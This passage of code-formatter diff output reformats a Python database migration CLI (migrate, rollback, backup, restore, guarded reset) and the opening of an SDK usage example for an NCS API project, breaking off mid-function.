         print(f"{color_code}[{level}]{Colors.NC} {message}")
     else:
         print(f"[{level}] {message}")
 
+
 def error_exit(message: str):
     """Print error and exit."""
     log("ERROR", message)
     sys.exit(1)
 
+
 class MigrationTracker:
     """Track migration status in database."""
-    
+
     def __init__(self, engine):
         self.engine = engine
         self.metadata = MetaData()
-        
+
         # Define migrations table
         self.migrations_table = Table(
-            'migration_history',
+            "migration_history",
             self.metadata,
-            Column('id', Integer, primary_key=True),
-            Column('migration_id', String(255), unique=True, nullable=False),
-            Column('filename', String(255), nullable=False),
-            Column('checksum', String(64), nullable=False),
-            Column('applied_at', DateTime(timezone=True), nullable=False),
-            Column('applied_by', String(255), nullable=False),
-            Column('execution_time_ms', Integer),
-            Column('success', String(10), nullable=False)
+            Column("id", Integer, primary_key=True),
+            Column("migration_id", String(255), unique=True, nullable=False),
+            Column("filename", String(255), nullable=False),
+            Column("checksum", String(64), nullable=False),
+            Column("applied_at", DateTime(timezone=True), nullable=False),
+            Column("applied_by", String(255), nullable=False),
+            Column("execution_time_ms", Integer),
+            Column("success", String(10), nullable=False),
         )
-        
+
     def ensure_migration_table(self):
         """Create migration tracking table if it doesn't exist."""
         try:
             self.metadata.create_all(self.engine, tables=[self.migrations_table])
             log("DEBUG", "Migration tracking table ensured")
         except Exception as e:
             error_exit(f"Failed to create migration table: {e}")
-    
+
     def get_applied_migrations(self) -> List[str]:
         """Get list of applied migration IDs."""
         try:
             with self.engine.connect() as conn:
                 result = conn.execute(
-                    text("SELECT migration_id FROM migration_history WHERE success = 'true' ORDER BY applied_at")
+                    text(
+                        "SELECT migration_id FROM migration_history WHERE success = 'true' ORDER BY applied_at"
+                    )
                 )
                 return [row[0] for row in result.fetchall()]
         except Exception as e:
             log("WARN", f"Could not fetch applied migrations: {e}")
             return []
-    
-    def record_migration(self, migration_id: str, filename: str, checksum: str, 
-                        execution_time_ms: int, success: bool, applied_by: str = "db_migrate.py"):
+
+    def record_migration(
+        self,
+        migration_id: str,
+        filename: str,
+        checksum: str,
+        execution_time_ms: int,
+        success: bool,
+        applied_by: str = "db_migrate.py",
+    ):
         """Record migration execution."""
         try:
             with self.engine.connect() as conn:
                 conn.execute(
-                    text("""
+                    text(
+                        """
                         INSERT INTO migration_history 
                         (migration_id, filename, checksum, applied_at, applied_by, execution_time_ms, success)
                         VALUES (:migration_id, :filename, :checksum, :applied_at, :applied_by, :execution_time_ms, :success)
-                    """),
+                    """
+                    ),
                     {
-                        'migration_id': migration_id,
-                        'filename': filename,
-                        'checksum': checksum,
-                        'applied_at': datetime.now(timezone.utc),
-                        'applied_by': applied_by,
-                        'execution_time_ms': execution_time_ms,
-                        'success': str(success).lower()
-                    }
+                        "migration_id": migration_id,
+                        "filename": filename,
+                        "checksum": checksum,
+                        "applied_at": datetime.now(timezone.utc),
+                        "applied_by": applied_by,
+                        "execution_time_ms": execution_time_ms,
+                        "success": str(success).lower(),
+                    },
                 )
                 conn.commit()
         except Exception as e:
             log("ERROR", f"Failed to record migration: {e}")
-    
+
     def remove_migration_record(self, migration_id: str):
         """Remove migration record (for rollback)."""
         try:
             with self.engine.connect() as conn:
                 conn.execute(
-                    text("DELETE FROM migration_history WHERE migration_id = :migration_id"),
-                    {'migration_id': migration_id}
+                    text(
+                        "DELETE FROM migration_history WHERE migration_id = :migration_id"
+                    ),
+                    {"migration_id": migration_id},
                 )
                 conn.commit()
                 log("DEBUG", f"Removed migration record: {migration_id}")
         except Exception as e:
             log("ERROR", f"Failed to remove migration record: {e}")
 
+
 class DatabaseMigrator:
     """Main database migration manager."""
-    
+
     def __init__(self, environment: str = "development", dry_run: bool = False):
         self.environment = environment
         self.dry_run = dry_run
         self.migrations_dir = project_root / "database" / "migrations"
         self.seeds_dir = project_root / "database" / "seeds"
-        
+
         # Get database URL for environment
         self.database_url = self._get_database_url()
-        
+
         # Create engine
         try:
             self.engine = create_engine(self.database_url, echo=False)
             self.tracker = MigrationTracker(self.engine)
         except Exception as e:
             error_exit(f"Failed to connect to database: {e}")
-    
+
     def _get_database_url(self) -> str:
         """Get database URL for environment."""
         # Try environment variable first
         env_var = f"DATABASE_URL_{self.environment.upper()}"
         if env_var in os.environ:
             return os.environ[env_var]
-        
+
         # Fall back to default DATABASE_URL
         if "DATABASE_URL" in os.environ:
             return os.environ["DATABASE_URL"]
-        
+
         # Fall back to environment-specific defaults
         defaults = {
             "development": "***localhost:5432/ncs_dev",
             "testing": "***localhost:5432/ncs_test",
             "staging": "***localhost:5432/ncs_staging",
-            "production": "***localhost:5432/ncs_prod"
+            "production": "***localhost:5432/ncs_prod",
         }
-        
+
         return defaults.get(self.environment, defaults["development"])
-    
+
     def _calculate_file_checksum(self, filepath: Path) -> str:
         """Calculate SHA-256 checksum of file."""
         sha256_hash = hashlib.sha256()
         with open(filepath, "rb") as f:
             for chunk in iter(lambda: f.read(4096), b""):
                 sha256_hash.update(chunk)
         return sha256_hash.hexdigest()
-    
+
     def _get_migration_files(self) -> List[Tuple[str, Path]]:
         """Get sorted list of migration files."""
         if not self.migrations_dir.exists():
             log("WARN", f"Migrations directory not found: {self.migrations_dir}")
             return []
-        
+
         migrations = []
         for file_path in self.migrations_dir.glob("*.sql"):
             # Extract migration ID from filename (e.g., "001_init.sql" -> "001")
-            migration_id = file_path.stem.split('_')[0]
+            migration_id = file_path.stem.split("_")[0]
             migrations.append((migration_id, file_path))
-        
+
         # Sort by migration ID
         migrations.sort(key=lambda x: x[0])
         return migrations
-    
+
     def _execute_sql_file(self, filepath: Path) -> Tuple[bool, int]:
         """Execute SQL file and return success status and execution time."""
         log("INFO", f"Executing SQL file: {filepath.name}")
-        
+
         if self.dry_run:
             log("INFO", f"[DRY RUN] Would execute: {filepath}")
             return True, 0
-        
+
         start_time = datetime.now()
-        
-        try:
-            with open(filepath, 'r') as f:
+
+        try:
+            with open(filepath, "r") as f:
                 sql_content = f.read()
-            
+
             # Split into individual statements
-            statements = [stmt.strip() for stmt in sql_content.split(';') if stmt.strip()]
-            
+            statements = [
+                stmt.strip() for stmt in sql_content.split(";") if stmt.strip()
+            ]
+
             with self.engine.connect() as conn:
                 for statement in statements:
                     if statement:
                         conn.execute(text(statement))
                 conn.commit()
-            
+
             execution_time = int((datetime.now() - start_time).total_seconds() * 1000)
             log("INFO", f"Successfully executed {filepath.name} in {execution_time}ms")
             return True, execution_time
-            
+
         except Exception as e:
             execution_time = int((datetime.now() - start_time).total_seconds() * 1000)
             log("ERROR", f"Failed to execute {filepath.name}: {e}")
             return False, execution_time
-    
+
     def init_database(self):
         """Initialize database schema."""
         log("MIGRATE", f"Initializing database for {self.environment} environment")
-        
+
         # Ensure migration tracking table exists
         if not self.dry_run:
             self.tracker.ensure_migration_table()
-        
+
         # Check if database is already initialized
         applied_migrations = self.tracker.get_applied_migrations()
         if applied_migrations:
-            log("WARN", f"Database already initialized with {len(applied_migrations)} migrations")
+            log(
+                "WARN",
+                f"Database already initialized with {len(applied_migrations)} migrations",
+            )
             return
-        
+
         # Look for init.sql file
         init_file = self.migrations_dir / "init.sql"
         if not init_file.exists():
             error_exit(f"init.sql not found in {self.migrations_dir}")
-        
+
         log("INFO", "Running initial database setup...")
-        
+
         # Execute init.sql
         success, execution_time = self._execute_sql_file(init_file)
-        
+
         if success and not self.dry_run:
             # Record the initialization
             checksum = self._calculate_file_checksum(init_file)
-            self.tracker.record_migration("000", "init.sql", checksum, execution_time, True)
+            self.tracker.record_migration(
+                "000", "init.sql", checksum, execution_time, True
+            )
             log("INFO", "Database initialization completed successfully")
         elif success:
             log("INFO", "[DRY RUN] Database initialization would complete successfully")
         else:
             error_exit("Database initialization failed")
-    
+
     def migrate(self, target_migration: Optional[str] = None):
         """Apply pending migrations."""
         log("MIGRATE", f"Applying migrations for {self.environment} environment")
-        
+
         # Ensure migration tracking table exists
         if not self.dry_run:
             self.tracker.ensure_migration_table()
-        
+
         # Get migration files and applied migrations
         migration_files = self._get_migration_files()
         applied_migrations = self.tracker.get_applied_migrations()
-        
+
         if not migration_files:
             log("INFO", "No migration files found")
             return
-        
+
         # Filter to pending migrations
         pending_migrations = []
         for migration_id, filepath in migration_files:
             if migration_id not in applied_migrations:
                 pending_migrations.append((migration_id, filepath))
                 if target_migration and migration_id == target_migration:
                     break
-        
+
         if not pending_migrations:
             log("INFO", "No pending migrations")
             return
-        
+
         log("INFO", f"Found {len(pending_migrations)} pending migrations")
-        
+
         # Apply each pending migration
         for migration_id, filepath in pending_migrations:
             log("MIGRATE", f"Applying migration {migration_id}: {filepath.name}")
-            
+
             success, execution_time = self._execute_sql_file(filepath)
-            
+
             if success and not self.dry_run:
                 checksum = self._calculate_file_checksum(filepath)
-                self.tracker.record_migration(migration_id, filepath.name, checksum, execution_time, True)
+                self.tracker.record_migration(
+                    migration_id, filepath.name, checksum, execution_time, True
+                )
                 log("INFO", f"Migration {migration_id} applied successfully")
             elif success:
-                log("INFO", f"[DRY RUN] Migration {migration_id} would apply successfully")
+                log(
+                    "INFO",
+                    f"[DRY RUN] Migration {migration_id} would apply successfully",
+                )
             else:
                 if not self.dry_run:
                     checksum = self._calculate_file_checksum(filepath)
-                    self.tracker.record_migration(migration_id, filepath.name, checksum, execution_time, False)
+                    self.tracker.record_migration(
+                        migration_id, filepath.name, checksum, execution_time, False
+                    )
                 error_exit(f"Migration {migration_id} failed")
-        
+
         if not self.dry_run:
             log("INFO", "All migrations applied successfully")
         else:
             log("INFO", "[DRY RUN] All migrations would apply successfully")
-    
+
     def rollback(self, target_migration: Optional[str] = None):
         """Rollback to previous migration."""
         log("MIGRATE", f"Rolling back migrations for {self.environment} environment")
-        
+
         applied_migrations = self.tracker.get_applied_migrations()
-        
+
         if not applied_migrations:
             log("INFO", "No migrations to rollback")
             return
-        
+
         if target_migration:
             if target_migration not in applied_migrations:
                 error_exit(f"Migration {target_migration} is not applied")
-            
+
             # Find migrations to rollback
             rollback_index = applied_migrations.index(target_migration)
-            migrations_to_rollback = applied_migrations[rollback_index + 1:]
+            migrations_to_rollback = applied_migrations[rollback_index + 1 :]
         else:
             # Rollback last migration only
             migrations_to_rollback = [applied_migrations[-1]]
-        
+
         if not migrations_to_rollback:
             log("INFO", "No migrations to rollback")
             return
-        
-        log("WARN", f"Rolling back {len(migrations_to_rollback)} migrations: {migrations_to_rollback}")
-        
+
+        log(
+            "WARN",
+            f"Rolling back {len(migrations_to_rollback)} migrations: {migrations_to_rollback}",
+        )
+
         if not self.dry_run and self.environment == "production":
             confirmation = input("This is PRODUCTION. Type 'ROLLBACK' to confirm: ")
             if confirmation != "ROLLBACK":
                 log("INFO", "Rollback cancelled")
                 return
-        
+
         # Look for rollback scripts
         for migration_id in reversed(migrations_to_rollback):
             rollback_file = self.migrations_dir / f"{migration_id}_rollback.sql"
-            
+
             if rollback_file.exists():
                 log("MIGRATE", f"Rolling back migration {migration_id}")
                 success, _ = self._execute_sql_file(rollback_file)
-                
+
                 if success and not self.dry_run:
                     self.tracker.remove_migration_record(migration_id)
                     log("INFO", f"Migration {migration_id} rolled back successfully")
                 elif success:
-                    log("INFO", f"[DRY RUN] Migration {migration_id} would rollback successfully")
+                    log(
+                        "INFO",
+                        f"[DRY RUN] Migration {migration_id} would rollback successfully",
+                    )
                 else:
                     error_exit(f"Rollback of migration {migration_id} failed")
             else:
                 log("WARN", f"No rollback script found for migration {migration_id}")
                 if not self.dry_run:
                     self.tracker.remove_migration_record(migration_id)
-    
+
     def seed_database(self):
         """Seed database with initial data."""
         log("MIGRATE", f"Seeding database for {self.environment} environment")
-        
+
         if not self.seeds_dir.exists():
             log("WARN", f"Seeds directory not found: {self.seeds_dir}")
             return
-        
+
         # Look for environment-specific seed file
         seed_files = [
             self.seeds_dir / f"{self.environment}.sql",
             self.seeds_dir / "common.sql",
-            self.seeds_dir / "seed.sql"
+            self.seeds_dir / "seed.sql",
         ]
-        
+
         executed_files = 0
         for seed_file in seed_files:
             if seed_file.exists():
                 log("INFO", f"Executing seed file: {seed_file.name}")
                 success, _ = self._execute_sql_file(seed_file)
-                
+
                 if success:
                     log("INFO", f"Seed file {seed_file.name} executed successfully")
                     executed_files += 1
                 else:
                     log("ERROR", f"Seed file {seed_file.name} failed")
-        
+
         if executed_files == 0:
             log("WARN", "No seed files found or executed")
         else:
             log("INFO", f"Database seeding completed ({executed_files} files)")
-    
+
     def backup_database(self, backup_file: str):
         """Create database backup."""
         log("MIGRATE", f"Creating database backup: {backup_file}")
-        
+
         # Parse database URL
         parsed_url = urlparse(self.database_url)
-        
+
         # Build pg_dump command
         cmd = [
             "pg_dump",
-            "--host", parsed_url.hostname or "localhost",
-            "--port", str(parsed_url.port or 5432),
-            "--username", parsed_url.username or "postgres",
-            "--dbname", parsed_url.path.lstrip('/'),
+            "--host",
+            parsed_url.hostname or "localhost",
+            "--port",
+            str(parsed_url.port or 5432),
+            "--username",
+            parsed_url.username or "postgres",
+            "--dbname",
+            parsed_url.path.lstrip("/"),
             "--verbose",
             "--clean",
             "--if-exists",
-            "--file", backup_file
+            "--file",
+            backup_file,
         ]
-        
+
         # Set password environment variable
         env = os.environ.copy()
         if parsed_url.password:
             env["PGPASSWORD"] = parsed_url.password
-        
+
         if self.dry_run:
             log("INFO", f"[DRY RUN] Would run: {' '.join(cmd)}")
             return
-        
+
         try:
             result = subprocess.run(cmd, env=env, capture_output=True, text=True)
-            
+
             if result.returncode == 0:
                 log("INFO", f"Database backup created successfully: {backup_file}")
-                
+
                 # Add metadata to backup
                 metadata = {
                     "created_at": datetime.now(timezone.utc).isoformat(),
                     "environment": self.environment,
-                    "database_url": self.database_url.replace(parsed_url.password or "", "***"),
-                    "applied_migrations": self.tracker.get_applied_migrations()
+                    "database_url": self.database_url.replace(
+                        parsed_url.password or "", "***"
+                    ),
+                    "applied_migrations": self.tracker.get_applied_migrations(),
                 }
-                
+
                 metadata_file = f"{backup_file}.metadata.json"
-                with open(metadata_file, 'w') as f:
+                with open(metadata_file, "w") as f:
                     json.dump(metadata, f, indent=2)
-                
+
                 log("INFO", f"Backup metadata saved: {metadata_file}")
             else:
                 error_exit(f"Backup failed: {result.stderr}")
-                
+
         except FileNotFoundError:
-            error_exit("pg_dump command not found. Please install PostgreSQL client tools.")
+            error_exit(
+                "pg_dump command not found. Please install PostgreSQL client tools."
+            )
         except Exception as e:
             error_exit(f"Backup failed: {e}")
-    
+
     def restore_database(self, backup_file: str, force: bool = False):
         """Restore database from backup."""
         log("MIGRATE", f"Restoring database from backup: {backup_file}")
-        
+
         if not os.path.exists(backup_file):
             error_exit(f"Backup file not found: {backup_file}")
-        
+
         # Check metadata if available
         metadata_file = f"{backup_file}.metadata.json"
         if os.path.exists(metadata_file):
-            with open(metadata_file, 'r') as f:
+            with open(metadata_file, "r") as f:
                 metadata = json.load(f)
-            
+
             log("INFO", f"Backup created: {metadata['created_at']}")
             log("INFO", f"Source environment: {metadata['environment']}")
             log("INFO", f"Applied migrations: {len(metadata['applied_migrations'])}")
-        
+
         # Confirmation for production
         if not force and self.environment == "production":
-            confirmation = input("This will DESTROY the production database. Type 'RESTORE' to confirm: ")
+            confirmation = input(
+                "This will DESTROY the production database. Type 'RESTORE' to confirm: "
+            )
             if confirmation != "RESTORE":
                 log("INFO", "Restore cancelled")
                 return
-        
+
         # Parse database URL
         parsed_url = urlparse(self.database_url)
-        
+
         # Build psql command
         cmd = [
             "psql",
-            "--host", parsed_url.hostname or "localhost",
-            "--port", str(parsed_url.port or 5432),
-            "--username", parsed_url.username or "postgres",
-            "--dbname", parsed_url.path.lstrip('/'),
-            "--file", backup_file
+            "--host",
+            parsed_url.hostname or "localhost",
+            "--port",
+            str(parsed_url.port or 5432),
+            "--username",
+            parsed_url.username or "postgres",
+            "--dbname",
+            parsed_url.path.lstrip("/"),
+            "--file",
+            backup_file,
         ]
-        
+
         # Set password environment variable
         env = os.environ.copy()
         if parsed_url.password:
             env["PGPASSWORD"] = parsed_url.password
-        
+
         if self.dry_run:
             log("INFO", f"[DRY RUN] Would run: {' '.join(cmd)}")
             return
-        
+
         try:
             result = subprocess.run(cmd, env=env, capture_output=True, text=True)
-            
+
             if result.returncode == 0:
                 log("INFO", "Database restored successfully")
             else:
                 error_exit(f"Restore failed: {result.stderr}")
-                
+
         except FileNotFoundError:
-            error_exit("psql command not found. Please install PostgreSQL client tools.")
+            error_exit(
+                "psql command not found. Please install PostgreSQL client tools."
+            )
         except Exception as e:
             error_exit(f"Restore failed: {e}")
-    
+
     def show_status(self):
         """Show migration status."""
         log("INFO", f"Migration status for {self.environment} environment")
-        
+
         try:
             # Get applied migrations
             applied_migrations = self.tracker.get_applied_migrations()
-            
+
             # Get all migration files
             migration_files = self._get_migration_files()
-            
+
             print(f"\nDatabase URL: {self.database_url}")
             print(f"Environment: {self.environment}")
             print(f"Applied migrations: {len(applied_migrations)}")
             print(f"Available migrations: {len(migration_files)}")
-            
+
             if migration_files:
                 print("\nMigration Status:")
                 print("ID    | Status  | Filename")
                 print("------|---------|------------------")
-                
+
                 for migration_id, filepath in migration_files:
-                    status = "Applied" if migration_id in applied_migrations else "Pending"
+                    status = (
+                        "Applied" if migration_id in applied_migrations else "Pending"
+                    )
                     print(f"{migration_id:5} | {status:7} | {filepath.name}")
-            
+
             # Show detailed history
             try:
                 with self.engine.connect() as conn:
                     result = conn.execute(
-                        text("""
+                        text(
+                            """
                             SELECT migration_id, filename, applied_at, execution_time_ms, success
                             FROM migration_history 
                             ORDER BY applied_at DESC 
                             LIMIT 10
-                        """)
+                        """
+                        )
                     )
-                    
+
                     history = result.fetchall()
                     if history:
                         print("\nRecent Migration History:")
-                        print("ID    | Filename         | Applied At          | Time(ms) | Success")
-                        print("------|------------------|---------------------|----------|--------")
-                        
+                        print(
+                            "ID    | Filename         | Applied At          | Time(ms) | Success"
+                        )
+                        print(
+                            "------|------------------|---------------------|----------|--------"
+                        )
+
                         for row in history:
-                            applied_at = row[2].strftime("%Y-%m-%d %H:%M:%S") if row[2] else "Unknown"
-                            print(f"{row[0]:5} | {row[1]:16} | {applied_at} | {row[3]:8} | {row[4]}")
-            
+                            applied_at = (
+                                row[2].strftime("%Y-%m-%d %H:%M:%S")
+                                if row[2]
+                                else "Unknown"
+                            )
+                            print(
+                                f"{row[0]:5} | {row[1]:16} | {applied_at} | {row[3]:8} | {row[4]}"
+                            )
+
             except Exception as e:
                 log("WARN", f"Could not fetch migration history: {e}")
-                
+
         except Exception as e:
             error_exit(f"Failed to get migration status: {e}")
-    
+
     def validate_database(self):
         """Validate database integrity."""
         log("MIGRATE", f"Validating database for {self.environment} environment")
-        
+
         checks = []
-        
+
         try:
             with self.engine.connect() as conn:
                 # Check if all expected tables exist
-                tables_query = text("""
+                tables_query = text(
+                    """
                     SELECT table_name 
                     FROM information_schema.tables 
                     WHERE table_schema = 'public' AND table_type = 'BASE TABLE'
-                """)
-                
+                """
+                )
+
                 result = conn.execute(tables_query)
                 existing_tables = {row[0] for row in result.fetchall()}
-                
+
                 expected_tables = {
-                    'migration_history', 'processing_sessions', 'clusters', 
-                    'data_points', 'performance_metrics', 'audit_logs',
-                    'user_activities', 'system_configurations'
+                    "migration_history",
+                    "processing_sessions",
+                    "clusters",
+                    "data_points",
+                    "performance_metrics",
+                    "audit_logs",
+                    "user_activities",
+                    "system_configurations",
                 }
-                
+
                 missing_tables = expected_tables - existing_tables
                 extra_tables = existing_tables - expected_tables
-                
+
                 if missing_tables:
                     checks.append(f"❌ Missing tables: {', '.join(missing_tables)}")
                 else:
                     checks.append("✅ All expected tables present")
-                
+
                 if extra_tables:
                     checks.append(f"⚠️  Extra tables: {', '.join(extra_tables)}")
-                
+
                 # Check indexes
-                indexes_query = text("""
+                indexes_query = text(
+                    """
                     SELECT schemaname, tablename, indexname
                     FROM pg_indexes
                     WHERE schemaname = 'public'
-                """)
-                
+                """
+                )
+
                 result = conn.execute(indexes_query)
                 index_count = len(result.fetchall())
                 checks.append(f"✅ Found {index_count} indexes")
-                
+
                 # Check constraints
-                constraints_query = text("""
+                constraints_query = text(
+                    """
                     SELECT COUNT(*) 
                     FROM information_schema.table_constraints 
                     WHERE table_schema = 'public'
-                """)
-                
+                """
+                )
+
                 result = conn.execute(constraints_query)
                 constraint_count = result.scalar()
                 checks.append(f"✅ Found {constraint_count} constraints")
-                
+
                 # Basic connectivity test
                 conn.execute(text("SELECT 1"))
                 checks.append("✅ Database connectivity test passed")
-        
+
         except Exception as e:
             checks.append(f"❌ Database validation failed: {e}")
-        
+
         print(f"\nDatabase Validation Results ({self.environment}):")
         for check in checks:
             print(f"  {check}")
-        
+
         # Check migration consistency
         try:
             applied_migrations = self.tracker.get_applied_migrations()
             migration_files = self._get_migration_files()
-            
+
             file_ids = {migration_id for migration_id, _ in migration_files}
             applied_ids = set(applied_migrations)
-            
+
             if applied_ids <= file_ids:
                 print("  ✅ Migration consistency check passed")
             else:
                 missing_files = applied_ids - file_ids
-                print(f"  ❌ Applied migrations missing files: {', '.join(missing_files)}")
-        
+                print(
+                    f"  ❌ Applied migrations missing files: {', '.join(missing_files)}"
+                )
+
         except Exception as e:
             print(f"  ❌ Migration consistency check failed: {e}")
-    
+
     def reset_database(self, force: bool = False):
         """Reset database (dangerous operation)."""
         log("MIGRATE", f"RESETTING database for {self.environment} environment")
-        
+
         if not force:
             if self.environment == "production":
                 error_exit("Cannot reset production database without --force flag")
-            
-            confirmation = input(f"This will DESTROY all data in {self.environment}. Type 'RESET' to confirm: ")
+
+            confirmation = input(
+                f"This will DESTROY all data in {self.environment}. Type 'RESET' to confirm: "
+            )
             if confirmation != "RESET":
                 log("INFO", "Reset cancelled")
                 return
-        
+
         if self.dry_run:
             log("INFO", "[DRY RUN] Would reset database")
             return
-        
+
         try:
             with self.engine.connect() as conn:
                 # Drop all tables
                 conn.execute(text("DROP SCHEMA public CASCADE"))
                 conn.execute(text("CREATE SCHEMA public"))
                 conn.execute(text("GRANT ALL ON SCHEMA public TO public"))
                 conn.commit()
-            
+
             log("INFO", "Database reset completed")
-            
+
             # Reinitialize
             self.init_database()
-            
+
         except Exception as e:
             error_exit(f"Database reset failed: {e}")
+
 
 def main():
     """Main function."""
     parser = argparse.ArgumentParser(
         description="Database migration management for NCS API",
-        formatter_class=argparse.RawDescriptionHelpFormatter
-    )
-    
-    subparsers = parser.add_subparsers(dest='command', help='Available commands')
-    
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+
+    subparsers = parser.add_subparsers(dest="command", help="Available commands")
+
     # Common arguments
     common_parser = argparse.ArgumentParser(add_help=False)
     common_parser.add_argument(
-        '--environment',
-        choices=['development', 'staging', 'production', 'testing'],
-        default='development',
-        help='Target environment'
-    )
-    common_parser.add_argument('--dry-run', action='store_true', help='Show what would be done')
-    common_parser.add_argument('--verbose', action='store_true', help='Verbose output')
-    
+        "--environment",
+        choices=["development", "staging", "production", "testing"],
+        default="development",
+        help="Target environment",
+    )
+    common_parser.add_argument(
+        "--dry-run", action="store_true", help="Show what would be done"
+    )
+    common_parser.add_argument("--verbose", action="store_true", help="Verbose output")
+
     # Init command
-    subparsers.add_parser('init', parents=[common_parser], help='Initialize database schema')
-    
+    subparsers.add_parser(
+        "init", parents=[common_parser], help="Initialize database schema"
+    )
+
     # Migrate command
-    migrate_parser = subparsers.add_parser('migrate', parents=[common_parser], help='Apply migrations')
-    migrate_parser.add_argument('--migration', help='Target specific migration ID')
-    
+    migrate_parser = subparsers.add_parser(
+        "migrate", parents=[common_parser], help="Apply migrations"
+    )
+    migrate_parser.add_argument("--migration", help="Target specific migration ID")
+
     # Rollback command
-    rollback_parser = subparsers.add_parser('rollback', parents=[common_parser], help='Rollback migrations')
-    rollback_parser.add_argument('--migration', help='Rollback to specific migration ID')
-    
+    rollback_parser = subparsers.add_parser(
+        "rollback", parents=[common_parser], help="Rollback migrations"
+    )
+    rollback_parser.add_argument(
+        "--migration", help="Rollback to specific migration ID"
+    )
+
     # Seed command
-    subparsers.add_parser('seed', parents=[common_parser], help='Seed database with data')
-    
+    subparsers.add_parser(
+        "seed", parents=[common_parser], help="Seed database with data"
+    )
+
     # Backup command
-    backup_parser = subparsers.add_parser('backup', parents=[common_parser], help='Create database backup')
-    backup_parser.add_argument('--backup-file', required=True, help='Backup file path')
-    
+    backup_parser = subparsers.add_parser(
+        "backup", parents=[common_parser], help="Create database backup"
+    )
+    backup_parser.add_argument("--backup-file", required=True, help="Backup file path")
+
     # Restore command
-    restore_parser = subparsers.add_parser('restore', parents=[common_parser], help='Restore from backup')
-    restore_parser.add_argument('--backup-file', required=True, help='Backup file path')
-    restore_parser.add_argument('--force', action='store_true', help='Force restore without confirmation')
-    
+    restore_parser = subparsers.add_parser(
+        "restore", parents=[common_parser], help="Restore from backup"
+    )
+    restore_parser.add_argument("--backup-file", required=True, help="Backup file path")
+    restore_parser.add_argument(
+        "--force", action="store_true", help="Force restore without confirmation"
+    )
+
     # Status command
-    subparsers.add_parser('status', parents=[common_parser], help='Show migration status')
-    
+    subparsers.add_parser(
+        "status", parents=[common_parser], help="Show migration status"
+    )
+
     # Validate command
-    subparsers.add_parser('validate', parents=[common_parser], help='Validate database integrity')
-    
+    subparsers.add_parser(
+        "validate", parents=[common_parser], help="Validate database integrity"
+    )
+
     # Reset command
-    reset_parser = subparsers.add_parser('reset', parents=[common_parser], help='Reset database (dangerous!)')
-    reset_parser.add_argument('--force', action='store_true', help='Force reset without confirmation')
-    
+    reset_parser = subparsers.add_parser(
+        "reset", parents=[common_parser], help="Reset database (dangerous!)"
+    )
+    reset_parser.add_argument(
+        "--force", action="store_true", help="Force reset without confirmation"
+    )
+
     args = parser.parse_args()
-    
+
     if not args.command:
         parser.print_help()
         sys.exit(1)
-    
+
     # Initialize migrator
     try:
         migrator = DatabaseMigrator(args.environment, args.dry_run)
     except Exception as e:
         error_exit(f"Failed to initialize migrator: {e}")
-    
+
     # Execute command
     try:
-        if args.command == 'init':
+        if args.command == "init":
             migrator.init_database()
-        elif args.command == 'migrate':
-            migrator.migrate(getattr(args, 'migration', None))
-        elif args.command == 'rollback':
-            migrator.rollback(getattr(args, 'migration', None))
-        elif args.command == 'seed':
+        elif args.command == "migrate":
+            migrator.migrate(getattr(args, "migration", None))
+        elif args.command == "rollback":
+            migrator.rollback(getattr(args, "migration", None))
+        elif args.command == "seed":
             migrator.seed_database()
-        elif args.command == 'backup':
+        elif args.command == "backup":
             migrator.backup_database(args.backup_file)
-        elif args.command == 'restore':
-            migrator.restore_database(args.backup_file, getattr(args, 'force', False))
-        elif args.command == 'status':
+        elif args.command == "restore":
+            migrator.restore_database(args.backup_file, getattr(args, "force", False))
+        elif args.command == "status":
             migrator.show_status()
-        elif args.command == 'validate':
+        elif args.command == "validate":
             migrator.validate_database()
-        elif args.command == 'reset':
-            migrator.reset_database(getattr(args, 'force', False))
+        elif args.command == "reset":
+            migrator.reset_database(getattr(args, "force", False))
         else:
             error_exit(f"Unknown command: {args.command}")
-    
+
     except KeyboardInterrupt:
         log("ERROR", "Operation interrupted by user")
         sys.exit(1)
     except Exception as e:
         error_exit(f"Command failed: {e}")
 
+
 if __name__ == "__main__":
-    main()
\ No newline at end of file
+    main()
--- /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/basic_usage.py	2025-06-10 20:31:25.484857+00:00
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/basic_usage.py
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/basic_usage.py	2025-06-10 20:32:35.123511+00:00
@@ -24,289 +24,291 @@
 
 # Add the parent directory to path for development
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from ncs_client import (
-    NCSClient, AsyncNCSClient,
-    NCSError, AuthenticationError, RateLimitError,
-    configure_logging, create_client_from_env
+    NCSClient,
+    AsyncNCSClient,
+    NCSError,
+    AuthenticationError,
+    RateLimitError,
+    configure_logging,
+    create_client_from_env,
 )
+
 
 def main():
     """Main example function demonstrating basic SDK usage."""
-    
+
     # Configure logging for better visibility
     configure_logging("INFO")
     logger = logging.getLogger(__name__)
-    
+
     print("🚀 NeuroCluster Streamer Python SDK - Basic Usage Example")
     print("=" * 60)
-    
+
     # =============================================================================
     # Example 1: Client Initialization
     # =============================================================================
     print("\n📡 Example 1: Client Initialization")
-    
+
     # Method 1: Direct initialization with API key
-    if os.getenv('NCS_API_KEY'):
+    if os.getenv("NCS_API_KEY"):
         client = NCSClient(
             base_url="https://api.yourdomain.com",
-            api_key=os.getenv('NCS_API_KEY'),
+            api_key=os.getenv("NCS_API_KEY"),
             timeout=30.0,
-            log_level="INFO"
+            log_level="INFO",
         )
         print("✅ Client initialized with API key")
-    
+
     # Method 2: Environment-based initialization
-    elif os.getenv('NCS_API_URL'):
+    elif os.getenv("NCS_API_URL"):
         try:
             client = create_client_from_env()
             print("✅ Client initialized from environment variables")
         except ValueError as e:
             print(f"❌ Environment setup error: {e}")
             print("💡 Set NCS_API_URL and NCS_API_KEY environment variables")
             return
-    
+
     # Method 3: Manual configuration for demo
     else:
         print("⚠️  No environment variables found. Using demo configuration.")
         client = NCSClient(
             base_url="https://demo.ncs-api.com",
             api_key="demo-api-key-12345",
-            timeout=30.0
+            timeout=30.0,
         )
         print("✅ Client initialized with demo configuration")
-    
+
     # =============================================================================
     # Example 2: Health Check
     # =============================================================================
     print("\n🏥 Example 2: API Health Check")
-    
+
     try:
         health = client.health_check()
         print(f"✅ API Status: {health.status}")
         print(f"   Version: {health.version}")
         print(f"   Algorithm Ready: {health.algorithm_ready}")
         print(f"   Uptime: {health.uptime_seconds:.1f} seconds")
-        
+
         if health.status != "healthy":
             print("⚠️  API is not fully healthy - proceeding with caution")
-    
+
     except Exception as e:
